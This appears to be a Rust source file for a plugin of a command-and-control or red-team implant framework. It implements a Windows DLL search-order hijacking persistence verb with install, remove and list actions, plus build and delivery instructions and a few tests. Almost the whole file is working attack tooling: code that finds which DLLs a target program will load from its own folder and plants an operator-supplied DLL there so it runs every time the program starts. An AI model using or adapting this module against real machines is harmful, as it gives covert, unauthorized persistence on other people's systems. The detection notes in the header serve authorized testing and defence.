//! The persistence family's last module (architecture.md Sec 5.4):
//! `persist.hijack`, the DLL search-order seat -- one discrete
//! installable and removable technique, the pairing todo.md's family
//! criterion turns on: the verb that installs a seat is the verb that
//! removes it, and both ride the task audit every dispatched action
//! already enters.
//!
//! The grammar gives one verb three actions -- `install` copies an
//! already-pushed file into the seat (the binary's own directory,
//! which the loader reads before System32), `remove` deletes it,
//! `list` reports the binary's open slots: the DLLs it imports that a
//! plant could claim. The install validates the slot before writing a
//! file -- the binary imports the DLL, the DLL sits outside
//! KnownDLLs, the seat is vacant -- because the module does not drop a
//! file onto a seat it has not proved the loader will use.
//!
//! The seat is the family's first on-disk file, and the module says
//! what that means: the planted DLL sits in the binary's directory as
//! a plain file any scanner hashes, it loads every time the binary
//! runs while it sits, and nothing in any system ledger names it --
//! the blue-team side of the footprint is file-system baselining, not
//! service or registry enumeration.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load hijack` task's content, then task `persist.hijack`
//! like any compiled verb. A non-Windows build compiles for the lane
//! and refuses the verb at run time: the technique has no seat to
//! touch there.

mod arguments;
mod loader;
// The parse half is pure and host-tested, but only the Windows
// execution calls it -- the same not(windows) allowance the family's
// other pure halves carry, stated once at the module the whole tree
// of it belongs to.
#[cfg_attr(not(windows), allow(dead_code))]
mod pe;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Hijack;

impl Plugin for Hijack {
    fn name(&self) -> &'static str {
        "hijack"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("persist.hijack", hijack)]
    }
}

fn hijack(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the
/// loader's order.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::Install => install(arguments),
        Action::Remove => remove(arguments),
        Action::List => list(arguments),
    }
}

/// The technique has no seat off Windows; the manifest's targets keep
/// the module off other loads, and this refusal keeps a stray dispatch
/// honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "persist.hijack: DLL search-order seats are a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

#[cfg(windows)]
fn install(arguments: &Arguments) -> Result<String, String> {
    let (binary, dll, source) = (
        arguments.binary.as_deref().unwrap_or_default(),
        arguments.dll.as_deref().unwrap_or_default(),
        arguments.source.as_deref().unwrap_or_default(),
    );
    let seat = loader::seat_path(binary, dll)
        .ok_or_else(|| format!("persist.hijack: the binary rides as a full path: '{binary}'"))?;

    // The slot's three proofs, in the order that costs least: the
    // binary exists and parses, it imports the DLL, the DLL is not a
    // KnownDLL the loader would take from System32 regardless, and
    // the seat itself is vacant.
    let image = std::fs::read(binary)
        .map_err(|_| format!("persist.hijack: the host binary does not exist: '{binary}'"))?;
    let imports = pe::import_names(&image)?;
    if !imports.iter().any(|name| name.eq_ignore_ascii_case(dll)) {
        return Err(format!(
            "persist.hijack: '{dll}' is not among '{binary}'s imports"
        ));
    }
    if loader::known_dlls()
        .iter()
        .any(|name| name.eq_ignore_ascii_case(dll))
    {
        return Err(format!(
            "persist.hijack: '{dll}' is a KnownDLL -- the loader takes it from system32 \
             before any binary's directory"
        ));
    }
    if loader::file_exists(&seat) {
        return Err(format!(
            "persist.hijack: the seat is occupied: '{seat}'; remove it first"
        ));
    }

    match loader::copy_file(source, &seat) {
        Ok(()) => Ok(format!(
            "installed {seat} ({binary} loads it before system32)"
        )),
        Err(status) => Err(format!(
            "persist.hijack: {seat}: {}",
            loader::status_message(status)
        )),
    }
}

#[cfg(windows)]
fn remove(arguments: &Arguments) -> Result<String, String> {
    let (binary, dll) = (
        arguments.binary.as_deref().unwrap_or_default(),
        arguments.dll.as_deref().unwrap_or_default(),
    );
    let seat = loader::seat_path(binary, dll)
        .ok_or_else(|| format!("persist.hijack: the binary rides as a full path: '{binary}'"))?;
    if !loader::file_exists(&seat) {
        return Err(format!("persist.hijack: the seat does not exist: '{seat}'"));
    }
    match loader::delete_file(&seat) {
        Ok(()) => Ok(format!("removed {seat}")),
        Err(status) => Err(format!(
            "persist.hijack: {seat}: {}",
            loader::status_message(status)
        )),
    }
}

/// The read: the binary's open slots, sorted by name so two reads of
/// one host report in the same order. A dll riding the task narrows
/// the report to that slot -- the confirmation half of an install the
/// operator just ran.
#[cfg(windows)]
fn list(arguments: &Arguments) -> Result<String, String> {
    let (binary, dll) = (
        arguments.binary.as_deref().unwrap_or_default(),
        arguments.dll.as_deref(),
    );
    let image = std::fs::read(binary)
        .map_err(|_| format!("persist.hijack: the host binary does not exist: '{binary}'"))?;
    let imports = pe::import_names(&image)?;

    let known = loader::known_dlls();
    let system32 = loader::system_directory();
    let directory = binary
        .rsplit_once('\\')
        .map(|(directory, _)| directory)
        .unwrap_or_default();

    let mut slots: Vec<(String, bool)> = imports
        .iter()
        .filter(|name| !known.iter().any(|known| known.eq_ignore_ascii_case(name)))
        .filter(|name| !loader::file_exists(&format!(r"{directory}\{name}")))
        .map(|name| {
            (
                name.clone(),
                loader::file_exists(&format!(r"{system32}\{name}")),
            )
        })
        .collect();
    slots.sort_by(|left, right| left.0.cmp(&right.0));
    slots.dedup_by(|left, right| left.0.eq_ignore_ascii_case(&right.0));

    let rows: Vec<String> = slots
        .iter()
        .filter(|(name, _)| dll.is_none_or(|wanted| name.eq_ignore_ascii_case(wanted)))
        .map(|(name, in_system32)| loader::slot_row(name, *in_system32))
        .collect();
    Ok(if rows.is_empty() {
        match dll {
            Some(wanted) => format!("no open slot named '{wanted}' beside {binary}"),
            None => format!("no open slots beside {binary}"),
        }
    } else {
        rows.join("\n")
    })
}

rod_plugin!(Hijack);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_bare_task_never_writes_it_refuses_naming_the_binary() {
        // The default action is list, but this seat has no system
        // ledger to enumerate: the read names the binary it inspects,
        // and a bare task refuses teaching that -- never a write.
        let refusal = hijack("").expect_err("the bare task refuses, naming the binary");
        assert!(refusal.contains("slots it reads"), "{refusal}");
    }

    #[test]
    fn the_read_names_the_binary_it_inspects() {
        #[cfg(windows)]
        {
            let refusal = hijack(r"list C:\app\app.exe").expect_err("a missing binary refuses");
            assert!(refusal.contains("does not exist"), "{refusal}");
        }
        #[cfg(not(windows))]
        {
            let refusal = hijack(r"list C:\app\app.exe").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(hijack(r"uninstall C:\app\app.exe").is_err());
        assert!(hijack(r"install C:\app\app.exe VERSION.DLL").is_err());
        assert!(hijack(r"remove C:\app\app.exe VERSION.DLL C:\temp\p.dll").is_err());
        assert!(hijack(r"list C:\app\app.exe VERSION.DLL C:\temp\p.dll").is_err());
    }
}
